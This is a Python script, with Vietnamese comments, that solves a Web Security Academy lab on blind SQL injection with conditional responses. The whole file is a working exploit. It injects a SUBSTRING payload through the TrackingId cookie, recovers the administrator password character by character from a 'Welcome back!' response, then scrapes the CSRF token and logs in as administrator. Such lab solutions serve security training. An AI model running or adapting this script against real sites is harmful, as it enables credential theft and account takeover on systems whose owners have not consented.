#Lab: Blind SQL injection with conditional responses
import requests
from bs4 import BeautifulSoup

print("Nhập URL giống như này (pls): https://(your-lab-id).web-security-academy.net/ ")
base_url = input("Nhập URL: ").rstrip("/")
res = requests.get(base_url)
tracking_id = res.cookies.get("TrackingId")

# Các kí có thể có trong password
charset = "abcdefghijklmnopqrstuvwxyz0123456789"
password = ""

print("[!] Bắt đầu mò mật khẩu...")

for i in range(1, 21):  # Duyệt từng vị trí ký tự
    for char in charset:
        payload = tracking_id + f"' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1) = '{char}'-- "
        cookies = {
            "TrackingId": payload,
            "session": res.cookies.get("session", "dummy")
        }
        res_test = requests.get(base_url, cookies=cookies)
        
        if "Welcome back!" in res_test.text:
            password += char
            print(f"Đã tìm được ký tự thứ {i}")
            break
    else:
        print("[-] Không tìm được ký tự nào ở vị trí", i)
        break

print(f"\n[+] Mật khẩu administrator là: {password}")
print(f"[!] Bắt đầu đăng nhập...")

# Đăng nhập
login_url = f"{base_url}/login"
session = requests.Session()
response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")
csrf = soup.find("input", {"name": "csrf"})["value"]

data = {
    "csrf": csrf,
    "username": "administrator",
    "password": password
}
response = session.post(login_url, data=data)

if (response.status_code == 200):
    print("[+] Ngon, đăng nhập vào được rồi.")
else:
    print("[-] Thua, ca này khó vl bố chịu.")